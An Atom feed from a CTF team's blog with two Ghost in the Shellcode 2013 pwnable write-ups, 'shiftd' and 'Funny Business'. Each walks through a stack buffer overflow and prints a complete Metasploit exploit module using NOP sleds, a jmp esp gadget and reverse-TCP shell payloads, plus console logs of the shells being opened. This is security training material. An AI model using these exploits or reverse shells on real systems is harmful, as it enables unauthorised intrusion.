@@ -1,0 +1,405 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: pwnable | CaptchaFlag CTF Team]]></title>
+  <link href="http://www.captchaflag.com/blog/categories/pwnable/atom.xml" rel="self"/>
+  <link href="http://www.captchaflag.com/"/>
+  <updated>2014-10-28T16:35:43-04:00</updated>
+  <id>http://www.captchaflag.com/</id>
+  <author>
+    <name><![CDATA[Captchaflag]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[GitS 2013 - Shiftd]]></title>
+    <link href="http://www.captchaflag.com/blog/2013/02/17/gits-2013-shiftd/"/>
+    <updated>2013-02-17T13:57:00-05:00</updated>
+    <id>http://www.captchaflag.com/blog/2013/02/17/gits-2013-shiftd</id>
+    <content type="html"><![CDATA[<h2>Challenge</h2>
+
+<p>Points: 100</p>
+
+<p>Find the key! (<a href="https://2013.ghostintheshellcode.com/shiftd-3a9c2a55e77d1467ee46dfb931170c737d24f310">File</a> running at shiftd.2013.ghostintheshellcode.com:5177)</p>
+
+<h2>Analysis</h2>
+
+<p>64-bit ELF. Note that unlike most challenges this app read from STDIN. In order to make it a networked service, we can run the following:
+<code>bash 
+stacks0n@ubuntu:~/Desktop$ nc -l -p 5177 -e ./shiftd
+</code></p>
+
+<p>Closes connection after sending any data for the most part. Open up in IDA and notice the following:
+<code>
+.text:0000000000400A42                 mov     edx, 0Ah
+.text:0000000000400A47                 mov     esi, 64
+.text:0000000000400A4C                 mov     rdi, rax
+.text:0000000000400A4F                 call    sub_4007F4
+.text:0000000000400A54                 lea     rax, [rbp-40h]
+.text:0000000000400A58                 lea     rsi, aNowisthewinter ; &quot;NowIsTheWinterOfOurDiscountTent&quot;
+.text:0000000000400A5F                 mov     rdi, rax
+.text:0000000000400A62                 call    _strcmp
+</code></p>
+
+<p>So, need to send special passphrase of &quot;NowIsTheWinterOfOurDiscountTent&quot;.</p>
+
+<p>Test run of the application:
+```
+$ nc shiftd.2013.ghostintheshellcode.com 5177
+NowIsTheWinterOfOurDiscountTent
+Welcome to Shifty's Time Formatting Service!
+What is your name?
+stacks0n
+Welcome, stacks0n 
+                  @!
+Please provide a time format:
+%D
+Your formatted time is:
+02/16/13</p>
+
+<p>Thank you! Come again!
+```</p>
+
+<p>When our username is returned to us, we notice a bunch of other data being printed out as well.</p>
+
+<p>sub_4007F4() is responsible for reading data from the socket. The prototype seems to be something like:</p>
+
+<p><code>
+read_from_socket(buffer, size, delimeter)
+</code>
+where the arguments are passed in registers. The delimeter is always specified by 0x0A (newline). The method reads one byte at a time until size is met or the delimeter is reached.</p>
+
+<p>Since buffers are not cleared out or null terminated, stack data is leaked when our username is printed back out to us. This is especially handy since the data contains a stack pointer which can later help us redirect execution. Note that the stack is executable, but randomized.</p>
+
+<p>Unfortunately, I spent too much time focusing on the call to strftime() and its format specifiers. Although you can prepend padding ('%100D'), there is no '%n' to write the number of bytes written.</p>
+
+<p>The code for reading in the format string is as follows:
+<code>
+.text:0000000000400931                 mov     rax, cs:off_601068
+.text:0000000000400938                 mov     rcx, rax
+.text:000000000040093B                 and     ecx, 7FFFFFFFh
+.text:0000000000400941                 lea     rax, [rbp+format]
+.text:0000000000400948                 mov     edx, 0Ah
+.text:000000000040094D                 mov     rsi, rcx
+.text:0000000000400950                 mov     rdi, rax
+.text:0000000000400953                 call    read_from_socket
+</code></p>
+
+<p>Note that the format string buffer is size 1024, and the call is:
+<code>
+read_from_socket(format, 0x6014b0, '\n').
+</code></p>
+
+<p>So there we have it, a stack based buffer overflow. 1064 bytes until we reach the stored return address on the stack. By leveraging the leaked stack pointer, we can redirect execution to our embedded shellcode.</p>
+
+<p>MSF Module:
+```ruby</p>
+
+<h1>This file is part of the Metasploit Framework and may be subject to</h1>
+
+<h1>redistribution and commercial restrictions. Please see the Metasploit</h1>
+
+<h1>web site for more information on licensing and terms of use.</h1>
+
+<h1>http://metasploit.com/</h1>
+
+<p>require 'msf/core'</p>
+
+<p>class Metasploit3 &lt; Msf::Exploit::Remote
+        Rank = GreatRanking</p>
+
+<pre><code>    include Msf::Exploit::Remote::Tcp
+
+    def initialize(info = {})
+            super(update_info(info,
+                    'Name'           =&gt; 'GitS 2013 Pwnable 100 - shiftd',
+                    'Author'         =&gt; [ 'stacks0n', 'hubris' ],
+                    'Privileged'     =&gt; false,
+                    'Platform'       =&gt; [ 'linux' ],
+                    'Arch'           =&gt; ARCH_X86_64,
+                    'Targets'        =&gt; [ [ 'Automatic', { }  ], ],
+                    'DefaultTarget'  =&gt; 0))
+
+            register_options(
+                    [
+                            Opt::RHOST('54.235.156.9'),
+                            Opt::RPORT(5177)
+                    ], self.class)
+
+    end
+
+    def exploit
+            connect
+
+            # send the secret password
+            # we can send extra data, not that it matters
+            sock.put(&quot;NowIsTheWinterOfOurDiscountTent\x00&quot; + &quot;A&quot; * 32 + &quot;\n&quot;)
+            print_status sock.get_once
+
+            # send the username
+            sock.put(&quot;|\n&quot;)
+            resp = print_status sock.get_once
+
+            # process the stack address that is leaked to us
+            stack_addr = &quot;\x00&quot; + resp.split(&quot;|&quot;).last.split(&quot;!&quot;).first + &quot;\x00\x00&quot;
+
+            # subtract some off this stack addres to allow us more room for
+            # nop sled and shellcode
+            stack_addr = [stack_addr.unpack(&quot;Q&quot;).first - 0x100].pack(&quot;Q&quot;)
+
+            # send the format string for strftime()
+            # overflow alert!
+            payload_size = 1064
+            junk = &quot;A&quot; * 48 # we don't want to trash our payload with push's
+            p = &quot;\x90&quot; * (payload_size - (payload.encoded.size + junk.size))
+            p += payload.encoded + junk
+
+            # send the payload
+            sock.put(p + stack_addr + &quot;\n&quot;)
+            print_status sock.get_once
+
+            handler
+            disconnect
+    end
+</code></pre>
+
+<p>```</p>
+
+<p>```bash
+msf  exploit(shiftd) &gt; show options</p>
+
+<p>Module options (exploit/gits/shiftd):</p>
+
+<p>Name   Current Setting  Required  Description</p>
+
+<hr>
+
+<p>RHOST  204.236.213.69   yes       The target address
+   RPORT  5177             yes       The target port</p>
+
+<p>Payload options (linux/x64/shell<em>reverse</em>tcp):</p>
+
+<p>Name   Current Setting  Required  Description</p>
+
+<hr>
+
+<p>LHOST  50.142.246.171   yes       The listen address
+   LPORT  4444             yes       The listen port</p>
+
+<p>Exploit target:</p>
+
+<p>Id  Name</p>
+
+<hr>
+
+<p>0   Automatic</p>
+
+<p>msf  exploit(shiftd) &gt; exploit</p>
+
+<p>[-] Handler failed to bind to 50.142.246.171:4444
+[<em>] Started reverse handler on 0.0.0.0:4444 
+[</em>] Welcome to Shifty's Time Formatting Service!
+What is your name?</p>
+
+<p>[*] Welcome, |??(!
+Please provide a time format:</p>
+
+<p>[*] Your formatted time is:
+??????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????j)X?j_j^H?H?</p>
+
+<p>Thank you! Come again!</p>
+
+<p>[*] Command shell session 1 opened (192.168.1.101:4444 -&gt; 204.236.213.69:36107) at 2013-02-16 16:49:49 -0500</p>
+
+<p>cat key
+cat: key: No such file or directory
+whoami
+shiftd
+cd /home/shiftd
+ls
+key
+shiftd
+cat key
+http://shifty.urbanup.com/4195551
+```</p>
+
+<h2>Solution</h2>
+
+<p>http://shifty.urbanup.com/4195551</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[GitS 2013 - Funny Business]]></title>
+    <link href="http://www.captchaflag.com/blog/2013/02/17/gits-2013-funny-business/"/>
+    <updated>2013-02-17T13:53:00-05:00</updated>
+    <id>http://www.captchaflag.com/blog/2013/02/17/gits-2013-funny-business</id>
+    <content type="html"><![CDATA[<h2>Challenge</h2>
+
+<p>Points: 100</p>
+
+<p>Find the key! (<a href="https://2013.ghostintheshellcode.com/funnybusiness-fb84813ddd932f6aceee0ed3a4e9f1e0a7082dc1">File</a> running at funnybusiness.2013.ghostintheshellcode.com)</p>
+
+<h2>Analysis</h2>
+
+<p>In order to get the binary to run on 32-bit Linux, you first need to run:
+<code>bash
+$ adduser funnybusiness
+$ sudo su
+$ ./funnybiz.elf
+</code></p>
+
+<p>Application is running on port 49681:
+<code>bash
+stacks0n@ubuntu:~/Desktop$ netstat -antp | grep LISTEN | grep funnybiz
+tcp        0      0 0.0.0.0:49681           0.0.0.0:*               LISTEN      17495/funnybiz.elf   
+</code></p>
+
+<p>Let's look at HexRays decompilation of sub<em>8048C60:
+```
+int __cdecl sub</em>8048D70(int sock_fd)
+{
+  int v1; // ebx@1
+  char v3; // [sp+1Fh] [bp-Dh]@4</p>
+
+<p>*(<em>QWORD *)&amp;strm.zalloc = 0LL;
+  strm.opaque = 0;
+  *(</em>QWORD *)&amp;strm.next<em>in = 0LL;
+  v1 = inflateInit</em>(&amp;strm, &quot;1.2.7&quot;, 56);
+  if ( !v1 )
+  {
+    read<em>data</em>from<em>socket(sock</em>fd, &amp;strm.avail<em>in, 4);
+    if ( strm.avail</em>in &lt;= 0x4000 )
+    {
+      read<em>data</em>from<em>socket(sock</em>fd, &amp;v3, strm.avail<em>in);
+      strm.next</em>in = (Bytef *)&v3;
+      strm.avail<em>out = 16384;
+      strm.next</em>out = (Bytef *)&amp;unk_804B0A0;
+      if ( inflate(&amp;strm, 4) != 1 )
+        exit(0);
+      inflateEnd(&amp;strm);
+    }
+  }
+  return v1;
+}
+```</p>
+
+<p>We first send the size of our zlib data, which must be less than 0x4000. The size we provide is then used for the number of bytes to be read off the wire next.</p>
+
+<p>The second call to read<em>from</em>socket() is copying our data directly to the stack, without any bounds checking. In this case, there isn't even a buffer allocated for the data. </p>
+
+<p>The last requirement is that the data supplied must be valid compressed zlib data, otherwise the program will exit before returning from this function. So, we simply send the smallest possible zlib stream and append our payload. The zlib stream will contain a size so we don't have to worry about the appended data.</p>
+
+<p>Find simple ROP gadget to redirect execution to the stack (since its executable) to avoid any issues with stack randomization.</p>
+
+<p><code>
+stacks0n@stack0ns-MacBook-Pro:~&gt; ./msfelfscan funnybiz.elf -j esp
+[/Users/stacks0n/funnybiz.elf]
+0x08049043 jmp esp
+</code></p>
+
+<p>MSF module as follows:
+```ruby</p>
+
+<h1>This file is part of the Metasploit Framework and may be subject to</h1>
+
+<h1>redistribution and commercial restrictions. Please see the Metasploit</h1>
+
+<h1>web site for more information on licensing and terms of use.</h1>
+
+<h1>http://metasploit.com/</h1>
+
+<p>require 'msf/core'</p>
+
+<p>class Metasploit3 &lt; Msf::Exploit::Remote
+        Rank = GreatRanking</p>
+
+<pre><code>    include Msf::Exploit::Remote::Tcp
+
+    def initialize(info = {})
+            super(update_info(info,
+                    'Name'           =&gt; 'GitS 2013 Pwnable 100 - Funny Business',
+                    'Author'         =&gt; 'stacks0n',
+                    'License'        =&gt; MSF_LICENSE,
+                    'Privileged'     =&gt; true,
+                    'Platform'       =&gt; 'linux',
+                    'DefaultTarget'  =&gt; 0))
+
+            register_options(
+                    [
+                            Opt::RHOST('54.235.156.9'),
+                            Opt::RPORT(49681)
+                    ], self.class)
+
+    end
+
+    def exploit
+            connect
+            # we must send valid zlib data so the code doesn't exit
+            # this is zlib deflation of a single 'a'
+            zlib    = &quot;\x78\x9C\x73\xE4\x02\x00\x00\x8E\x00\x4C&quot;
+            padding = &quot;\x90\x90\x90&quot;
+            rop     = &quot;\x43\x90\x04\x08&quot; # jmp esp
+            p       = zlib + padding + rop + payload.encoded
+
+            # send the size of our payload
+            sock.put([p.size].pack(&quot;L&quot;))
+            # send the payload
+            sock.put(p)
+
+            handler
+            disconnect
+    end
+</code></pre>
+
+<p>end
+```</p>
+
+<p>```bash
+msf  exploit(funny_business) &gt; show options</p>
+
+<p>Module options (exploit/gits/funny_business):</p>
+
+<p>Name   Current Setting  Required  Description</p>
+
+<hr>
+
+<p>RHOST  54.235.156.9     yes       The target address
+   RPORT  49681            yes       The target port</p>
+
+<p>Payload options (linux/x86/shell<em>reverse</em>tcp):</p>
+
+<p>Name   Current Setting  Required  Description</p>
+
+<hr>
+
+<p>LHOST  68.47.237.170     yes       The listen address
+   LPORT  4444             yes       The listen port</p>
+
+<p>Exploit target:</p>
+
+<p>Id  Name</p>
+
+<hr>
+
+<p>0   Automatic</p>
+
+<p>msf  exploit(funny_business) &gt; exploit </p>
+
+<p>[-] Handler failed to bind to 68.47.237.170:4444
+[<em>] Started reverse handler on 0.0.0.0:4444 
+[</em>] Command shell session 1 opened (192.168.1.30:4444 -&gt; 54.235.156.9:57768) at 2013-02-15 23:54:39 -0500</p>
+
+<p>cat key
+Compressions can be hard at times
+```</p>
+
+<h2>Solution</h2>
+
+<p>Compressions can be hard at times</p>
+]]></content>
+  </entry>
+  
+</feed>
